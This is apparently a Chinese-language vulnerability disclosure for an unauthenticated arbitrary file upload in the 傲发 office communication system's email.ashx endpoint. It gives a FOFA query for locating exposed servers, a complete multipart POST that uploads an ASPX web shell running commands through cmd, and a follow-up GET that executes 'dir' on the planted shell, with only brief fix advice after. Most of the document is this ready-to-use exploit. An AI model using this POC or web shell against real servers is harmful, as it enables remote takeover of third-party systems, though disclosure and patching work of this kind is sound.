## 傲发办公通信专家 email.ashx 任意文件上传漏洞

## 漏洞描述
傲发办公通信专家系统 `email.ashx?action=updatefiles` 接口上传功能缺少文件类型校验与身份验证，远程攻击者可直接上传任意脚本文件并访问执行，最终获取服务器权限。

## 网络空间测绘
```
fofa: body="getincommingcall"
```

## POC
```
POST /handle/email.ashx?action=updatefiles&logname=stc HTTP/1.1
Host: <target domain>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=---WebKitFormBoundaryFfJZ4P1AZBixjELj
Accept: */*
Connection: close

---WebKitFormBoundaryFfJZ4P1AZBixjELj
Content-Disposition: form-data; name="file"; filename="1234.aspx"
Content-Type: image/png

<%@ Page Language="JScript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
...
Response.End();
%>

---WebKitFormBoundaryFfJZ4P1AZBixjELj--
```

上传成功后访问：
```
GET /upFiles/email/temp/stc/1234.aspx?cmd=dir HTTP/1.1
Host: <target domain>
```

## 修复建议
- 对上传文件进行类型与后缀校验，限制到白名单
- 上传目录与脚本执行目录隔离，禁止执行权限
- 增加接口身份认证、令牌校验

## 参考
- 社区披露

